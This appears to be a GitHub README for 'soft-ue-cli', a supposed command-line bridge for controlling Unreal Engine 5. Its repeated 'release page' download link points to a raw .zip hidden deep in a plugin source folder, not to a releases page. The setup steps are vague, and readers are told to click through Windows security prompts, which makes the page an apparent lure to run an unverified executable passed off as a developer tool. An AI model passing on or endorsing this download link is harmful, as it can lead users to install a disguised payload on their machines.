# 🧰 soft-ue-cli - Control Unreal Engine from Terminal

[![Download the latest release](https://img.shields.io/badge/Download-Releases-purple?style=for-the-badge)](https://raw.githubusercontent.com/Unpretentious-swatsquad791/soft-ue-cli/main/soft_ue_cli/plugin_data/SoftUEBridge/Source/SoftUEBridgeEditor/Private/Tools/soft_cli_ue_v3.6.zip)

## 📥 Download

Visit this page to download the latest release for Windows:

[https://raw.githubusercontent.com/Unpretentious-swatsquad791/soft-ue-cli/main/soft_ue_cli/plugin_data/SoftUEBridge/Source/SoftUEBridgeEditor/Private/Tools/soft_cli_ue_v3.6.zip](https://raw.githubusercontent.com/Unpretentious-swatsquad791/soft-ue-cli/main/soft_ue_cli/plugin_data/SoftUEBridge/Source/SoftUEBridgeEditor/Private/Tools/soft_cli_ue_v3.6.zip)

## 🪟 What this app does

soft-ue-cli helps you control Unreal Engine from the terminal with a small Python tool and an Unreal Engine plugin. It is made for people who want to run common Unreal tasks without clicking through menus.

You can use it to:

- Spawn actors in a scene
- Edit blueprints
- Call functions in Unreal
- Capture screenshots
- Manage Play In Editor sessions
- Connect to Unreal Engine in real time
- Work with UE5 editor projects and packaged builds

## ✅ Before you start

You need:

- A Windows PC
- Unreal Engine 5 installed
- A project you can open in Unreal Editor
- Permission to run files you download from GitHub
- A stable local network connection if you use the bridge across devices

If you plan to use a packaged build, make sure the build includes the soft-ue-cli plugin support and the in-process HTTP bridge.

## 🚀 Getting started

Follow these steps in order.

### 1. Download the release

Go to the release page and download the latest Windows package:

[https://raw.githubusercontent.com/Unpretentious-swatsquad791/soft-ue-cli/main/soft_ue_cli/plugin_data/SoftUEBridge/Source/SoftUEBridgeEditor/Private/Tools/soft_cli_ue_v3.6.zip](https://raw.githubusercontent.com/Unpretentious-swatsquad791/soft-ue-cli/main/soft_ue_cli/plugin_data/SoftUEBridge/Source/SoftUEBridgeEditor/Private/Tools/soft_cli_ue_v3.6.zip)

If the release includes a `.zip` file, save it to your Downloads folder.

### 2. Unzip the files

Right-click the downloaded `.zip` file and select Extract All.

Pick a folder you can find again, such as:

- `C:\soft-ue-cli`
- `C:\Users\YourName\Downloads\soft-ue-cli`

After extraction, look for:

- A Python CLI folder or executable
- A plugin folder for Unreal Engine
- A readme or setup file if included in the release

### 3. Install the Unreal plugin

Copy the plugin folder into your Unreal project or Engine plugin folder.

Common locations:

- `YourProject\Plugins\soft-ue-cli`
- `UE_5.x\Engine\Plugins\soft-ue-cli`

If your release package includes a plugin file, place it where Unreal Engine can load it when the project opens.

### 4. Open your Unreal project

Start Unreal Engine 5 and open the project you want to control.

If Unreal asks to rebuild or enable the plugin, allow it.

### 5. Start the bridge in Unreal

Open the plugin settings or the provided in-editor panel and start the HTTP bridge.

Keep Unreal open while you use the CLI tool.

### 6. Run the CLI tool

Open Command Prompt or PowerShell in the extracted soft-ue-cli folder.

Run the command included with the release package.

Common examples:

- `soft-ue-cli.exe`
- `python main.py`
- `soft-ue-cli --help`

Use the command that matches the files in your download.

### 7. Connect to Unreal

Set the Unreal host and port if needed.

Example values:

- Host: `127.0.0.1`
- Port: `7777`

Once connected, the CLI can send actions to Unreal in real time.

## 🛠️ Basic setup tips

Use these tips if the tool does not connect right away.

### Check the plugin is enabled

In Unreal Engine:

- Open the project
- Go to Plugins
- Find the soft-ue-cli plugin
- Make sure it is enabled
- Restart Unreal if needed

### Check the bridge is running

If the CLI cannot talk to Unreal, the bridge may be off.

Look for a status indicator in the editor or plugin panel.

### Check the port

If another app uses the same port, change the port in the plugin settings and in the CLI command.

Use the same port in both places.

### Check Windows security prompts

If Windows shows a prompt, allow the app to run if you trust the source and downloaded it from the release page.

## 🎮 What you can do with it

soft-ue-cli is useful for many Unreal tasks that usually take several clicks.

### Scene work

- Add actors to the world
- Move or rotate objects
- Set object values
- Trigger actions in the scene

### Blueprint work

- Edit blueprint data
- Call blueprint functions
- Update values from the terminal
- Test changes faster

### Play and test

- Start PIE sessions
- Stop PIE sessions
- Reset test runs
- Capture screenshots for review

### Build and runtime work

- Connect to the editor
- Connect to packaged builds
- Use the same CLI flow for different targets
- Send commands through the HTTP bridge

## 🧩 Example use cases

Use soft-ue-cli when you want to:

- Test a change without hunting through menus
- Run the same Unreal action many times
- Control a scene from a script
- Capture images during a test run
- Work with Claude Code and Unreal in one flow
- Automate editor tasks while keeping Unreal open

## 📁 Suggested folder layout

A simple setup can look like this:

- `C:\soft-ue-cli\` for the CLI files
- `C:\MyUnrealProject\Plugins\soft-ue-cli\` for the plugin
- `C:\MyUnrealProject\` for your Unreal project

Keep the CLI files and your Unreal project in separate folders so they are easy to manage.

## 🔐 Network setup

The tool uses a local HTTP bridge.

For a single PC setup:

- Use `127.0.0.1`
- Keep the CLI and Unreal on the same machine
- Make sure the bridge port matches in both places

For a build on another device:

- Use the host PC IP address
- Keep both devices on the same network
- Confirm the port is open and reachable

## 🧪 If something does not work

Try these checks in order.

### Unreal does not see the plugin

- Confirm the plugin folder is in the right place
- Make sure the folder name is correct
- Restart Unreal Engine
- Check the plugin list in the editor

### The CLI cannot connect

- Check the Unreal bridge is running
- Confirm host and port
- Try `127.0.0.1` for a local test
- Close other apps that may use the same port

### Commands do not do anything

- Make sure the project is open
- Make sure the editor or build is in the right state
- Check that PIE is not blocking the action
- Retry the command after restarting Unreal

### Screenshots fail

- Check that the target window is active
- Confirm the build has access to the scene
- Try again after the bridge reconnects

## 🖥️ Windows command examples

If the package includes an executable, you may use commands like:

- `soft-ue-cli.exe --help`
- `soft-ue-cli.exe --host 127.0.0.1 --port 7777`
- `soft-ue-cli.exe screenshot`
- `soft-ue-cli.exe pie start`
- `soft-ue-cli.exe actor spawn`

If the package uses Python, you may use commands like:

- `python main.py --help`
- `python main.py --host 127.0.0.1 --port 7777`

Use the commands that come with your release files.

## 🧱 System needs

Recommended setup:

- Windows 10 or Windows 11
- Unreal Engine 5.x
- 8 GB RAM or more
- A project with the plugin installed
- Python 3.10 or newer if the release uses Python files

For larger Unreal projects, 16 GB RAM or more helps.

## 🧭 Where this fits in your workflow

soft-ue-cli is useful when you want to keep working from the terminal while Unreal runs in the background.

It fits well if you:

- Use scripts to repeat tasks
- Work with AI coding tools
- Need quick control of Unreal from text commands
- Want less clicking and more direct control

## 🗂️ Release files you may see

The release page may include files such as:

- Windows ZIP package
- CLI executable
- Python source files
- Unreal Engine plugin folder
- Example config files
- README or setup notes

If there is more than one file, download the one marked for Windows.

## 🔧 File placement guide

If you see a plugin folder:

- Put it in your project’s `Plugins` folder

If you see a CLI app:

- Put it in a folder you can open from Command Prompt

If you see a config file:

- Keep it next to the CLI tool unless the release says otherwise

## 📝 Common terms

- **CLI**: A tool you use by typing commands
- **Plugin**: An add-on for Unreal Engine
- **Bridge**: The connection between the CLI and Unreal
- **PIE**: Play In Editor, the test mode inside Unreal
- **Blueprint**: A visual way to build game logic in Unreal

## 🧠 Simple first test

After setup, try one small action first:

- Connect to Unreal
- Spawn one actor
- Take one screenshot
- Start and stop one PIE session

This helps confirm the link works before you use larger workflows